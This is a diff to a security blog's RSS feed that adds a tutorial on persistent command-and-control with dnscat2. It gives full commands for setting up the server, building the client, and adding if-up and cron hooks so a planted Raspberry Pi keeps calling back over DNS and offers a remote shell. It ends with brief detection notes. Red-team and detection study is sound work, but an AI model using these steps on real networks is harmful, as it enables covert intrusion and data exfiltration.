@@ -9,6 +9,146 @@
     <atom:link href="https://www.thesubtlety.com/categories/development/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>Persistent C2 with dnscat2</title>
+      <link>https://www.thesubtlety.com/post/persistent-dnscat2/</link>
+      <pubDate>Mon, 19 Dec 2016 17:19:40 -0800</pubDate>
+      
+      <guid>https://www.thesubtlety.com/post/persistent-dnscat2/</guid>
+      <description>
+
+&lt;p&gt;Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don&amp;rsquo;t currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.&lt;/p&gt;
+
+&lt;p&gt;Thanks to some awesome work by &lt;a href=&#34;https://twitter.com/iagox86&#34;&gt;iagox86&lt;/a&gt;, these directions can be used to configure &lt;a href=&#34;https://github.com/iagox86/dnscat2&#34;&gt;dnscat2&lt;/a&gt; to automatically connect back to your server over DNS in an automated fashion, similar to a PwnPlug.&lt;/p&gt;
+
+&lt;h2 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;A linux box (raspberry pi)&lt;/li&gt;
+&lt;li&gt;A domain name&lt;/li&gt;
+&lt;li&gt;A VPS&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;directions&#34;&gt;Directions&lt;/h2&gt;
+
+&lt;h3 id=&#34;authoritative-dns&#34;&gt;Authoritative DNS&lt;/h3&gt;
+
+&lt;p&gt;Configure an authoritative name server on the DNS provider account. Using namecheap for instance:&lt;/p&gt;
+
+&lt;p&gt;Manage Domain &amp;gt; Advanced DNS &amp;gt; Add Personal DNS Servers &amp;gt; &lt;code&gt;ns1 == ip.ad.dre.ss&lt;/code&gt; and &lt;code&gt;ns2 == ip.ad.dre.ss&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, under Domain &amp;gt; Use Custom DNS &amp;gt; use &lt;code&gt;ns1.examplecom&lt;/code&gt; and &lt;code&gt;ns2.example.com&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Check this is working by running on the server: &lt;code&gt;sudo nc -vv -l -u -p53&lt;/code&gt; and from another machine &lt;code&gt;nslookup ns1.example.com&lt;/code&gt; to verify traffic is hitting this IP.&lt;/p&gt;
+
+&lt;h3 id=&#34;set-up-dnscat2-server-side&#34;&gt;Set up dnscat2 server side&lt;/h3&gt;
+
+&lt;p&gt;Log in to your VPS, get dnscat2, and install it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# apt-get update
+# apt-get -y install ruby-dev git make g++
+# gem install bundler
+# git clone https://github.com/iagox86/dnscat2.git
+# cd dnscat2/server
+# bundle install
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And start the server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ruby /home/admin/dnscat2/server/dnscat2.rb --secret=verysecret ns1.example.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;configure-the-client-raspberry-pi&#34;&gt;Configure the client/Raspberry Pi&lt;/h3&gt;
+
+&lt;h4 id=&#34;compile-the-dnscat2-client&#34;&gt;Compile the dnscat2 client&lt;/h4&gt;
+
+&lt;p&gt;On the Raspberry Pi or client&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/iagox86/dnscat2.git
+$ cd dnscat2/client/
+$ make
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this point you can run dnscat2 with the following to confirm things are working. We&amp;rsquo;ll be coming back to this so no need to keep in running.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo /home/rpi/dnscat2/client/dnscat --secret=verysecret --dns domain=ns1.example.com,type=TXT
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;You can also leave out the domain and instead specify an ip: &lt;code&gt;./dnscat --dns=server=1.2.3.4,port=53&lt;/code&gt; but this is a direct connection out port 53 which may be blocked. It also clearly shows dnscat2 on the wire and will likely be flagged by IDS/IPS&lt;/li&gt;
+&lt;li&gt;You can specify various DNS record types but TXT records have been fairly stable for me in the past&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;configure-persistance&#34;&gt;Configure Persistance&lt;/h4&gt;
+
+&lt;p&gt;We want our little remote computer to always be connected to us. Every time it&amp;rsquo;s plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there&amp;rsquo;s always a callback.&lt;/p&gt;
+
+&lt;p&gt;Make &lt;code&gt;eth0&lt;/code&gt; ask for a DHCP address everytime it&amp;rsquo;s plugged in&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$cat /etc/networking/interfaces
+  auto eth0
+  allow-hotplug eth0
+  iface eth0 inet dhcp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Add an &lt;code&gt;interface up&lt;/code&gt; start script&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$cat /home/rpi/start_dnscat2
+  #!/bin/bash    
+  echo &amp;quot;[+] Starting dnscat2...&amp;quot;
+  tmux new -s dnscat -d /home/rpi/dnscat2/client/dnscat ns1.example.com
+$ln -s  /home/rpi/start_dnscat2 /etc/network/if-up.d/start_dnscat2
+$chmod +x /home/rpi/start_dnscat2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Configure &lt;code&gt;cron&lt;/code&gt; to check every five minutes if &lt;code&gt;dnscat2&lt;/code&gt; is running and start it if not.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$cat check_and_start_dnscat2.sh 
+#!/bin/bash
+
+if ! $(ps aux | grep -i &amp;quot;[t]mux&amp;quot; &amp;gt; /dev/null); then
+    echo &amp;quot;[!] Starting dnscat2...&amp;quot;
+        /home/rpi/start_dnscat2
+else
+    echo &amp;quot;[+] dnscat2 is running...&amp;quot;
+fi
+
+$crontab -e
+*/5 * * * * /home/rpi/check_and_start_dnscat2.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&amp;rsquo;s it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.&lt;/p&gt;
+
+&lt;h3 id=&#34;dnscat2-reference&#34;&gt;dnscat2 reference&lt;/h3&gt;
+
+&lt;p&gt;dnscat2 isn&amp;rsquo;t super intuitive so some operational notes for quick reference:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Start the server under a tmux session&lt;/li&gt;
+&lt;li&gt;Within the dnscat2 prompt, type &lt;code&gt;sessions&lt;/code&gt; to see what you have available and interact with &lt;code&gt;sessions -i 1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Within a session type &lt;code&gt;help&lt;/code&gt; to list available commands and &lt;code&gt;shell&lt;/code&gt; then &lt;code&gt;session -i &amp;lt;window#&amp;gt;&lt;/code&gt; for an interactive shell&lt;/li&gt;
+&lt;li&gt;Exit the shell session by &lt;code&gt;Control-z&lt;/code&gt; or &lt;code&gt;exit&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;identifying-dnscat2-on-the-wire&#34;&gt;Identifying dnscat2 on the wire&lt;/h3&gt;
+
+&lt;p&gt;There are number of ways to identify malicious DNS traffic and &lt;a href=&#34;https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152&#34;&gt;this SANS paper&lt;/a&gt; details quite a few methods of identification. In addition, in this case we&amp;rsquo;re specifying TXT records which aren&amp;rsquo;t too common. &lt;a href=&#34;http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf&#34;&gt;One paper&lt;/a&gt; (Table 1) puts TXT record usage around 7% of a given large sample size. &lt;a href=&#34;http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html&#34;&gt;Another&lt;/a&gt; puts that usage at closer to less than 1%.&lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who&amp;rsquo;s not careful is likely to be identified.&lt;/p&gt;
+
+&lt;h3 id=&#34;resources&#34;&gt;Resources&lt;/h3&gt;
+
+&lt;p&gt;Most of this info is from iagox86&amp;rsquo;s github and Lenny Zeltser&amp;rsquo;s write up on dnscat2.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2&#34;&gt;https://github.com/iagox86/dnscat2&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md&#34;&gt;https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://zeltser.com/c2-dns-tunneling/&#34;&gt;https://zeltser.com/c2-dns-tunneling/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152&#34;&gt;https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
       <title>OpenDNS&#39;s AppSec Training Lab</title>
       <link>https://www.thesubtlety.com/post/opendnss-appsec-training-lab/</link>
       <pubDate>Sun, 23 Aug 2015 00:27:58 +0000</pubDate>
